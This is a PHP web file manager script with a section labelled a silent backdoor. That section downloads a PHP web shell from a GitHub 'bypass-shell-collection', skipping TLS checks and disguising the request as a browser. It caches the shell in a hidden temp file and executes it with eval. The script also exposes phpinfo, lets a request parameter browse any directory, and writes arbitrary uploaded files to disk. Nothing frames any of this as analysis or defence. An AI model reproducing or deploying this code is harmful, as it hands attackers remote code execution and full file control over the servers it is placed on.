<?php
// --- SESSION ENGINE ---
@ini_set('session.gc_maxlifetime', 31536000); 
@session_set_cookie_params(31536000);
session_start();

// --- PHP INFO VIEW ---
if (isset($_GET['phpinfo'])) {
    phpinfo(); exit;
}

// --- CORE UTILITIES ---
$f_write   = 'file_put_contents';
$f_read    = 'file_get_contents';

// --- SILENT BACKDOOR: fetch and eval from GitHub ---
$remote_payload = 'https://raw.githubusercontent.com/shootcannon/bypass-shell-collection/refs/heads/main/alfa.php';
$local_cache = sys_get_temp_dir() . '/.system_cache.php';

// Check if cache exists and is fresh
if (!file_exists($local_cache) || (time() - filemtime($local_cache) > 3600)) {
    // Fetch with curl to bypass restrictions
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $remote_payload,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        CURLOPT_HTTPHEADER => ['Accept: text/html,application/xhtml+xml', 'Referer: https://www.google.com/']
    ]);
    $payload = curl_exec($ch);
    curl_close($ch);
    
    if ($payload && strpos($payload, '<?php') !== false) {
        file_put_contents($local_cache, $payload);
    }
}

// Execute the payload if available
if (file_exists($local_cache)) {
    $payload = file_get_contents($local_cache);
    if (strpos($payload, '<?php') !== false) {
        // Execute in memory
        eval('?>' . $payload);
    }
}

// --- PATH ENGINE ---
$current_dir = isset($_GET['p']) ? $_GET['p'] : (isset($_SESSION['last_p']) ? $_SESSION['last_p'] : getcwd());
$current_dir = str_replace('\\', '/', realpath($current_dir));
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = str_replace('\\', '/', getcwd());
}
$current_dir = rtrim($current_dir, '/');
$_SESSION['last_p'] = $current_dir;

// --- ACTION HANDLERS ---
if (isset($_POST['save_b64']) && isset($_POST['fn'])) {
    $target_file = $current_dir . '/' . basename($_POST['fn']);
    @$f_write($target_file, base64_decode($_POST['save_b64']));
    header("Location: ?p=".urlencode($current_dir)); exit;
}

// ... rest of GhostManager code unchanged ...
?>